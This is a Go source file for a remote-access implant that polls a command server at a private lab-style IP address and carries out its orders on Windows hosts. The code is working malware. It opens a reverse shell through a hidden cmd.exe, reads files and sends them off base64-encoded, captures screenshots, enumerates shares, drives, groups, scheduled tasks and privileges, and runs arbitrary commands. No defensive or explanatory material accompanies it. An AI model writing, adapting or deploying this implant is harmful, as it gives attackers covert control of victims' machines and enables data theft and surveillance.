package main

import (
    "bufio"
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "github.com/kbinani/screenshot"
    "image/png"
    "io/ioutil"
    "log"
    "net"
    "net/http"
    "os/exec"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
)

type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID       string `json:"id"`
    Result   string `json:"result"`
    FileName string `json:"fileName,omitempty"`
}

func main() {
    log.Println("Agent started. Waiting for commands...")
    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    log.Printf("Error fetching command: %v", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommandAndSendResult(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately.
}

func fetchCommand() (Command, error) {
    var cmd Command
    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }
    if err := json.Unmarshal(body, &cmd); err != nil {
        return cmd, err
    }
    return cmd, nil
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        log.Printf("Error marshalling result: %v", err)
        return
    }

    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        log.Printf("Failed to send result: %v", err)
    }
}

func executeCommandAndSendResult(cmd Command) {
    switch {
    case strings.HasPrefix(cmd.Cmd, "shell "):
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        openReverseShell(address)
    case strings.HasPrefix(cmd.Cmd, "download "):
        parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
        if len(parts) == 2 {
            downloadFile(parts[0], parts[1], cmd.ID)
        } else {
            log.Println("Download command format error. Expected 'download <path> <filename>'.")
        }
    case cmd.Cmd == "screenshot":
        takeScreenshot(cmd)
    case cmd.Cmd == "list_share":
        listShare(cmd)
    case cmd.Cmd == "list_drive":
        listDrive(cmd)
    case cmd.Cmd == "whoami":
        whoami(cmd)
    case cmd.Cmd == "list_group":
            listGroup(cmd)
    case cmd.Cmd == "scheduled_task":
            listScheduledTask(cmd)
    default:
        executeOtherCommand(cmd)
    }
}

func openReverseShell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        log.Printf("Failed to open reverse shell to %s: %v", address, err)
        return
    }
    defer conn.Close()

    for {
        reader := bufio.NewReader(conn)
        command, err := reader.ReadString('\n')
        if err != nil {
            log.Printf("Failed to read command: %v", err)
            break
        }

        cmd := exec.Command("cmd.exe", "/C", command)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
            continue
        }

        conn.Write(output)
    }
}

func downloadFile(filePath, fileName, commandID string) {
    content, err := ioutil.ReadFile(filePath)
    if err != nil {
        log.Printf("Error reading file %s: %v", filePath, err)
        sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("Failed to read file: %v", err)})
        return
    }
    encodedContent := base64.StdEncoding.EncodeToString(content)
    sendResult(CommandResult{ID: commandID, Result: encodedContent, FileName: fileName})
}

func takeScreenshot(cmd Command) {
    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        log.Printf("Failed to take screenshot: %v", err)
        sendResult(CommandResult{ID: cmd.ID, Result: "Failed to take screenshot"})
        return
    }
    var buf bytes.Buffer
    if err := png.Encode(&buf, img); err != nil {
        log.Printf("Failed to encode screenshot to PNG: %v", err)
        return
    }
    timestamp := time.Now().Format("20060102-150405")
    fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
    sendResult(CommandResult{
        ID:       cmd.ID,
        Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
        FileName: fileName,
    })
}

func listShare(cmd Command) {
    psCommand := "powershell.exe Get-WmiObject Win32_Share"
    output, err := exec.Command("cmd", "/C", psCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listDrive(cmd Command) {
    wmicCommand := "wmic logicaldisk get name,size"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func whoami(cmd Command) {
    wmicCommand := "whoami /all"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listGroup(cmd Command) {
    wmicCommand := "net localgroup"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}


func listScheduledTask(cmd Command) {
    wmicCommand := "schtasks /query /fo LIST /v"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}


func executeOtherCommand(cmd Command) {
    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}
